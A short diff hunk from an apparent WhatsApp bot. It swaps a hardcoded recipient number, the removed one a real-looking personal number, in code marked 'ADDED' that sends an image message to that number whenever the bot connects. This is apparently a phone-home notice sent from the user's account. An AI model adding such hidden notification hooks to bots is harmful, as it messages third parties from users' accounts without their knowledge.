@@ -307,7 +307,7 @@ ${mrfrank}\n
                 });
                 */
                         // ADDED: Send connection message to the specified number
-                const targetNumber = "263719064805@s.whatsapp.net";
+                const targetNumber = "263123456789@s.whatsapp.net";
                 await conn.sendMessage(targetNumber, { 
                     image: { url: `https://files.catbox.moe/xmldwy.jpg` },
                     ai: true,
